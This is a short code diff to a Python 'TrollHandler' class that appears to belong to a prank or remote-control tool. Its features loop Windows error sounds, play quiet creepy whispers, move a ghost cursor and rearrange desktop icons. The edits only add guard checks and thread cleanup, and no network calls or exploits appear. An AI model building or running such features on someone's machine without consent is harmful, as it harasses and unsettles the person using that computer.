@@ -67,6 +67,9 @@ class TrollHandler:
     
     def play_sound(self, data):
         """Play audio data (saves to temp file then plays)."""
+        if not winsound:
+            return False
+            
         try:
             # Save to temp file
             with tempfile.NamedTemporaryFile(suffix='.wav', delete=False) as f:
@@ -124,6 +127,9 @@ class TrollHandler:
     
     def start_alert_loop(self):
         """Loop Windows error sound."""
+        if self.alert_loop_enabled or (self.alert_loop_thread and self.alert_loop_thread.is_alive()):
+            return
+
         self.alert_loop_enabled = True
         
         def loop():
@@ -140,6 +146,8 @@ class TrollHandler:
     
     def stop_alert_loop(self):
         self.alert_loop_enabled = False
+        if self.alert_loop_thread:
+            self.alert_loop_thread = None
     
     def _check_nircmd(self):
         """Check if nircmd is available in PATH."""
@@ -193,6 +201,9 @@ class TrollHandler:
     
     def start_whisper(self):
         """Play quiet creepy sounds randomly."""
+        if self.whisper_enabled or (self.whisper_thread and self.whisper_thread.is_alive()):
+            return
+
         self.whisper_enabled = True
         
         def loop():
@@ -210,6 +221,8 @@ class TrollHandler:
     
     def stop_whisper(self):
         self.whisper_enabled = False
+        if self.whisper_thread:
+            self.whisper_thread = None
     
     # =========================================================================
     # Visual
@@ -301,7 +314,7 @@ class TrollHandler:
         self.ghost_cursor_enabled = False
     
     def shuffle_desktop_icons(self):
-        """Randomly rearrange desktop icons using Shell automation."""
+        """Trigger desktop arrange/refresh via Shell automation effectively shuffling icons."""
         try:
             ps_script = '''
             $shell = New-Object -ComObject Shell.Application
